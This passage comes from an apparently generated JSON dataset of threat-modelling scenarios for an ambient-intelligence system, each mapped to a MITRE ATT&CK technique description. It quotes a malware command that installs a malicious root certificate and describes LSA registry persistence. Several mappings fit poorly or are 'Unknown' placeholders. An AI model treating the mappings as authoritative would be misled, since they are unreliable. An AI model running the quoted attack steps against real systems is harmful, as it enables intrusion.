                "description": "Windows Authentication Package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. (Citation: MSDN Authentication Packages)\n\nAdversaries can use the autostart mechanism provided by LSA Authentication Packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=<target binary></code>. The binary will then be executed by the system when the authentication packages are loaded.",
                "id": "attack-pattern--52d40641-c480-4ad5-81a3-c80ccaddf82d",
                "technique_id": "T1131"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is transmitted unencrypted over the communication infrastructure and intercepted by an attacker.",
            "Assumptions": [
                {
                    "Assumption": "Data is sent in plaintext",
                    "Role": "Application Developer",
                    "Condition": "Lack of encryption protocols in place"
                },
                {
                    "Assumption": "Network traffic is unmonitored",
                    "Role": "Network Admin",
                    "Condition": "No intrusion detection system (IDS)"
                },
                {
                    "Assumption": "Access points are not secured",
                    "Role": "IT Admin",
                    "Condition": "Weak or default passwords used for Wi-Fi"
                }
            ],
            "Potential Impact": "Unauthorized access and leakage of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unencrypted traffic",
                "interception",
                "network security"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to data repositories and exfiltrates sensitive information stored in the cloud storage.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are misconfigured",
                    "Role": "Cloud Admin",
                    "Condition": "Overly permissive settings"
                },
                {
                    "Assumption": "Data is not encrypted at rest",
                    "Role": "IT Admin",
                    "Condition": "Sensitive data stored in plaintext"
                },
                {
                    "Assumption": "No network segmentation",
                    "Role": "Network Admin",
                    "Condition": "Unprotected access to cloud storage from any network segment"
                }
            ],
            "Potential Impact": "Compromise of sensitive user data and system configurations.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud storage",
                "data exfiltration",
                "access control"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Personal biometric data collected by sensors is exposed through misconfigured APIs.",
            "Assumptions": [
                {
                    "Assumption": "APIs lack authentication and authorization mechanisms",
                    "Role": "API Developer",
                    "Condition": "Publicly accessible APIs"
                },
                {
                    "Assumption": "No data masking or obfuscation techniques used",
                    "Role": "Application Developer",
                    "Condition": "Raw data exposed through APIs"
                },
                {
                    "Assumption": "APIs are not regularly tested for vulnerabilities",
                    "Role": "Security Team",
                    "Condition": "No regular security testing"
                }
            ],
            "Potential Impact": "Risk of identity theft and privacy violations.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "API security",
                "biometric data",
                "misconfiguration"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A distributed denial of service (DDoS) attack overwhelms the communication infrastructure, disrupting system operations.",
            "Assumptions": [
                {
                    "Assumption": "No DDoS mitigation services",
                    "Role": "Network Admin",
                    "Condition": "Lack of traffic filtering and rate limiting"
                },
                {
                    "Assumption": "System does not use load balancing",
                    "Role": "IT Admin",
                    "Condition": "Single point of failure for network traffic"
                },
                {
                    "Assumption": "Network is not monitored for unusual patterns",
                    "Role": "Security Team",
                    "Condition": "No active network monitoring"
                }
            ],
            "Potential Impact": "System unavailability and interrupted user services.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network traffic",
                "communication infrastructure"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malware infection on key system components causes resource exhaustion and system failures.",
            "Assumptions": [
                {
                    "Assumption": "Endpoints lack adequate antivirus protection",
                    "Role": "IT Admin",
                    "Condition": "Antivirus not installed or outdated"
                },
                {
                    "Assumption": "No regular patching and updates",
                    "Role": "System Admin",
                    "Condition": "Outdated software with known vulnerabilities"
                },
                {
                    "Assumption": "No network segmentation",
                    "Role": "Network Admin",
                    "Condition": "Unrestricted access between segments"
                }
            ],
            "Potential Impact": "Long-term unavailability and potential system crash.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "resource exhaustion",
                "system failure"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a zero-day vulnerability in the AmI system, causing critical components to crash.",
            "Assumptions": [
                {
                    "Assumption": "Zero-day vulnerabilities are exploited",
                    "Role": "Attacker",
                    "Condition": "Unpatched software contains unknown vulnerabilities"
                },
                {
                    "Assumption": "No real-time monitoring for attacks",
                    "Role": "Security Operations Center",
                    "Condition": "Lack of intrusion detection systems"
                },
                {
                    "Assumption": "Critical software components lack redundancy",
                    "Role": "System Designer",
                    "Condition": "No failover mechanisms"
                }
            ],
            "Potential Impact": "Critical operations halted and major system disruptions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "zero-day",
                "vulnerability",
                "system crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of a poorly configured privileged account to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Privileged accounts are not managed carefully",
                    "Role": "System Admin",
                    "Condition": "Accounts used for non-administrative tasks"
                },
                {
                    "Assumption": "No least privilege principle followed",
                    "Role": "Application Admin",
                    "Condition": "Users have more privileges than necessary"
                },
                {
                    "Assumption": "No account usage monitoring",
                    "Role": "Security Team",
                    "Condition": "Privilege escalations are not audited"
                }
            ],
            "Potential Impact": "Unrestricted access to all system resources and data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "privileged account",
                "administrative access",
                "misconfiguration"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attackers exploit known vulnerabilities in the device firmware to gain high-level access.",
            "Assumptions": [
                {
                    "Assumption": "Firmware is outdated",
                    "Role": "Device Manufacturer",
                    "Condition": "Security patches not applied"
                },
                {
                    "Assumption": "No vulnerability scanning",
                    "Role": "Security Team",
                    "Condition": "Regular scans not performed"
                },
                {
                    "Assumption": "No firmware validation during boot",
                    "Role": "System Designer",
                    "Condition": "Devices boot with unverified firmware"
                }
            ],
            "Potential Impact": "Complete device takeover and manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "firmware",
                "vulnerability",
                "device takeover"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attackers use social engineering to obtain elevated credential details from an insider.",
            "Assumptions": [
                {
                    "Assumption": "Lack of security awareness training",
                    "Role": "HR Department",
                    "Condition": "Employees are not trained on phishing tactics"
                },
                {
                    "Assumption": "No multi-factor authentication (MFA)",
                    "Role": "System Admin",
                    "Condition": "Elevated access only requires a password"
                },
                {
                    "Assumption": "No insider threat monitoring",
                    "Role": "Security Team",
                    "Condition": "Behavior monitoring systems are not in place"
                }
            ],
            "Potential Impact": "Unauthorized administrative changes and data access.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "social engineering",
                "insider threat",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "20",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses stolen credentials to imitate a legitimate user and gain unauthorized access to the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are stored in insecure manner",
                    "Role": "System Administrator",
                    "Condition": "Credentials are not encrypted or protected by multi-factor authentication"
                },
                {
                    "Assumption": "The attacker has access to network traffic",
                    "Role": "Network Administrator",
                    "Condition": "Network lacks adequate security measures such as encryption or secure protocols"
                },
                {
                    "Assumption": "Users may fall for phishing attacks",
                    "Role": "End User",
                    "Condition": "Users are not trained on cybersecurity best practices"
                }
            ],
            "Potential Impact": "The attacker can manipulate environment settings, access sensitive user data, and disrupt system operations.",
            "MITRE ATT&CK Keywords": [
                "account manipulation",
                "credential access",
                "phishing",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics the behavior of authorized devices to interact with the communication infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "Device authentication is weak or non-existent",
                    "Role": "System Engineer",
                    "Condition": "Devices communicate over an insecure network"
                },
                {
                    "Assumption": "Devices are not regularly monitored for anomalies",
                    "Role": "Security Operations",
                    "Condition": "Lack of continuous anomaly detection mechanisms"
                },
                {
                    "Assumption": "Firmware and software updates are not enforced",
                    "Role": "IT Manager",
                    "Condition": "Devices run outdated or vulnerable firmware"
                }
            ],
            "Potential Impact": "Unauthorized control over actuators and sensors, leading to manipulated environmental settings and potential overloading of system components.",
            "MITRE ATT&CK Keywords": [
                "device spoofing",
                "network intrusion",
                "injection"
            ],
            "mitre_technique": {
                "name": "Process Injection",
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
                "technique_id": "T1055"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a cloned biometric sample to bypass biometric authentication and gain access to user data or system controls.",
            "Assumptions": [
                {
                    "Assumption": "Biometric data is insufficiently protected",
                    "Role": "Data Protection Officer",
                    "Condition": "Biometric data is not encrypted"
                },
                {
                    "Assumption": "Users' biometric data can be captured and replicated",
                    "Role": "Security Analyst",
                    "Condition": "Biometric systems are not tamper-resistant"
                },
                {
                    "Assumption": "The system lacks secondary authentication methods",
                    "Role": "IT Security Manager",
                    "Condition": "Single-factor authentication is used"
                }
            ],
            "Potential Impact": "Unauthorized access to user data and system controls, compromising data confidentiality and system integrity.",
            "MITRE ATT&CK Keywords": [
                "biometric spoofing",
                "identity theft",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Pluggable Authentication Modules",
                "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
                "technique_id": "T1556.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to a sensor and alters its settings to feed false data into the system.",
            "Assumptions": [
                {
                    "Assumption": "Physical security measures are weak",
                    "Role": "Facility Manager",
                    "Condition": "Sensors are placed in accessible locations without surveillance"
                },
                {
                    "Assumption": "Sensors lack tamper detection mechanisms",
                    "Role": "System Designer",
                    "Condition": "Sensors are not designed with tamper-proof housing"
                },
                {
                    "Assumption": "Maintenance routines are infrequent",
                    "Role": "Maintenance Technician",
                    "Condition": "Periodic audits and checks are not performed regularly"
                }
            ],
            "Potential Impact": "Corruption of environmental data, leading to improper decision-making by AI/ML models and incorrect system responses.",
            "MITRE ATT&CK Keywords": [
                "physical tampering",
                "sensor manipulation",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data within the data repositories to disrupt the AI/ML model's learning process.",
            "Assumptions": [
                {
                    "Assumption": "Database security is inadequate",
                    "Role": "Database Administrator",
                    "Condition": "Databases are accessible without proper authentication"
                },
                {
                    "Assumption": "AI/ML model updates are not secured",
                    "Role": "AI/ML Engineer",
                    "Condition": "Model update mechanisms are not validated"
                },
                {
                    "Assumption": "Data integrity checks are missing",
                    "Role": "Data Analyst",
                    "Condition": "No validation checks for data before processing"
                }
            ],
            "Potential Impact": "AI/ML models make incorrect decisions, negatively affecting system performance and user experience.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "model poisoning",
                "database"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies communication traffic to inject malicious commands to actuators.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are unencrypted",
                    "Role": "Network Administrator",
                    "Condition": "Data sent over unsecured protocols"
                },
                {
                    "Assumption": "No intrusion detection or prevention systems in place",
                    "Role": "Security Analyst",
                    "Condition": "Lack of monitoring for unusual traffic patterns"
                },
                {
                    "Assumption": "Devices do not authenticate messages",
                    "Role": "System Architect",
                    "Condition": "Systems lacking message integrity checks"
                }
            ],
            "Potential Impact": "Actuators perform unauthorized actions, potentially causing physical harm or system malfunctions.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "communication tampering",
                "actuator control"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious user performs actions within the system but denies responsibility due to lack of proper logging mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are insufficient",
                    "Role": "System Administrator",
                    "Condition": "Logs do not capture sufficient detail"
                },
                {
                    "Assumption": "Access controls are not properly implemented",
                    "Role": "IT Security Manager",
                    "Condition": "Actions are not properly attributed to users"
                },
                {
                    "Assumption": "Log tampering is possible",
                    "Role": "Security Analyst",
                    "Condition": "Logs can be edited without detection"
                }
            ],
            "Potential Impact": "Inability to trace malicious actions, making forensic analysis and incident response challenging.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "action repudiation",
                "audit deficiency"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user denies performing certain actions that have caused system disruptions.",
            "Assumptions": [
                {
                    "Assumption": "Audit trails are incomplete or fragmented",
                    "Role": "Audit Manager",
                    "Condition": "Logs are not centralized or correlated"
                },
                {
                    "Assumption": "Actions are not authenticated",
                    "Role": "IT Security Manager",
                    "Condition": "User actions are not logged with identifying information"
                },
                {
                    "Assumption": "No non-repudiation mechanisms in place",
                    "Role": "System Architect",
                    "Condition": "There are no mechanisms, such as digital signatures, to verify actions"
                }
            ],
            "Potential Impact": "Difficulties in accountability, potentially leading to misattribution or unaddressed vulnerabilities.",
            "MITRE ATT&CK Keywords": [
                "action denial",
                "log incompleteness",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
